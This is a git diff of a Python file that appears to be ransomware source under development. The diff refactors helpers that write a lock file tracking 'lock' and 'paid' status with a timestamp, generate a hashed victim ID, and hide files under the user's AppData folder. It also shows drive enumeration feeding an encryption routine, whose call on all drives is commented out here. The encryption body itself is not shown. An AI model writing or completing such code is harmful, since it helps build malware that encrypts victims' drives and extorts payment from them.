@@ -5,6 +5,7 @@ import random
 import hashlib
 import socket
 import secrets
+import datetime
 
 __rmfolderPath = f"C:/Users/{os.getlogin()}/AppData/Local/bkms/"
 testPath = "./data/"
@@ -26,27 +27,33 @@ def checkfile():
     except FileNotFoundError:
         print("No found")
         return 0
+    
+class __createFile:
+    def __init__(self,path):
+        self.path = path
 
-def __createCheckfile():
-    rmfilePath = testPath + "lock.json"
-    data = {
-        "lock":1,
-        "paid":0,
+    def checkfile(self,fileName):
+        rmfilePath = self.path + "/" + fileName
+        data = {
+            "lock":1,
+            "paid":0,
+            "lockTime":datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            }
+        with open(rmfilePath,"w") as file:
+            json.dump(data,file,indent=4)
+
+    def randomID(self,fileName,length=16):
+        letters_and_digits = string.ascii_letters + string.digits
+        random_string = ''.join(random.choice(letters_and_digits) for _ in range(length))
+        id = hashlib.sha256(random_string.encode()).hexdigest()
+
+        rmfilePath = self.path + "/" + fileName
+        data = {
+            "id":id
         }
-    with open(rmfilePath,"w") as file:
-        json.dump(data,file,indent=4)
+        with open(rmfilePath,"w") as file:
+            json.dump(data,file,indent=4)
 
-def __createRandomID(length=16):
-    letters_and_digits = string.ascii_letters + string.digits
-    random_string = ''.join(random.choice(letters_and_digits) for _ in range(length))
-    id = hashlib.sha256(random_string.encode()).hexdigest()
-
-    rmfilePath = testPath + "id.json"
-    data = {
-        "id":id
-    }
-    with open(rmfilePath,"w") as file:
-        json.dump(data,file,indent=4)
 
 def _getAvaiblableDrives():
     drives = []
@@ -78,12 +85,14 @@ def __Encryprion(path):
 
 def runEncryption():
     print("Encryption start")
-    __createCheckfile()
-    __createRandomID()
+
+    __cf = __createFile(testPath)
+    __cf.checkfile("lock.json")
+    __cf.randomID("id.json")
     drives = _getAvaiblableDrives()
     print(drives)
 
-    __Encryprion(drives)
+    #__Encryprion(drives)
     
 
 
